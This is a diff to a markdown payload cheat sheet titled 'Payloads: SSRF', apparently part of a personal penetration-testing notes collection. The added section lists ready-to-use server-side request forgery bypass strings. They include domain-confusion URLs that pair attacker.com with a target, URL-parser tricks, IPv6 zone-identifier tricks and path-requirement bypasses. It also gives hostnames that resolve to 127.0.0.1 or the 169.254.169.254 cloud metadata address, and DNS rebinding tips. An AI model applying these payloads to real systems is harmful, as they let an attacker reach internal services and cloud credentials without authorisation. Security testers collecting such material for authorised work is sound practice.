@@ -2,9 +2,9 @@
 title: "Payloads: SSRF"
 type: payloads
 tags: [payloads, ssrf, web, cloud]
-sources: []
+sources: [hacktricks-web]
 date_created: 2026-06-05
-date_updated: 2026-06-30
+date_updated: 2026-07-14
 ---
 
 # Payloads: SSRF
@@ -113,6 +113,47 @@ send('POST','/management/',80, body='username=admin&password=admin')
 Gopher = TCP only (services, Redis `gopher://h:6379/_<cmds>`, FastCGI). It cannot read files; for
 files you need `file://`/`php://` and those are often keyword-filtered (case-insensitive -> case
 tricks won't help).
+
+## URL-format and domain-confusion bypass
+Decimal/octal/hex + double-encoding already present above; do not duplicate.
+Domain-confusion set (swap attacker.com <-> 127.0.0.1 / target host):
+```
+https://{target}@attacker.com          https://attacker.com#{target}
+https://{target}.attacker.com          https://attacker.com@{target}
+https://{target}%6D@attacker.com       https://attacker.com%23@{target}
+https://attacker.com\{target}/         https://attacker.com%00{target}
+https://attacker.com;https://{target}  https://attacker.com/.{target}
+https://attacker.com\@@{target}        https://attacker.com\anything@{target}/
+http://1.1.1.1 &@2.2.2.2# @3.3.3.3/    next={target}&next=attacker.com
+# colon+backslash parser confusion (CVE-2025-0454 autogpt):
+http://localhost:\@google.com/../
+# backslash trick (WHATWG treats \ as /):  http://example.com\@169.254.169.254/
+```
+Domain-parser bypasses (missing scheme slashes / leading junk):
+```
+https:attacker.com   https:/attacker.com   http:/\/\attacker.com   //attacker.com
+\\/\/attacker.com/    /\/attacker.com/      %0D%0A/attacker.com     #attacker.com
+attacker%00.com       attacker%E3%80%82com  attacker。com
+```
+IPv6 zone-identifier trick (filters that stop parsing at `%`):
+```
+http://[fe80::1%25eth0]/            http://[fe80::a9ff:fe00:1%25en0]/
+```
+Path / extension requirement bypass:
+```
+https://metadata/vuln/path#/expected/path
+https://metadata/vuln/path#.extension
+https://metadata/expected/path/..%2f..%2f/vuln/path
+```
+DNS-to-localhost / metadata service hostnames (no encoding, resolve to internal):
+```
+localtest.me                     127.0.0.1.nip.io            spoofed.burpcollaborator.net -> 127.0.0.1
+bugbounty.dod.network -> 127.0.0.2   1ynrnhl.xip.io -> 169.254.169.254
+customer1.app.localhost.my.company.127.0.0.1.nip.io
+```
+DNS rebinding (single-resolve filters, 2025): pass a public IP at check time, rebind to
+127.0.0.1 / 169.254.169.254 before connect (nccgroup/singularity). Tools: Burp-Encode-IP,
+recollapse, SSRF-PayloadMaker, PortSwigger url-validation-bypass cheat sheet.
 
 ## Wired sub-techniques
 
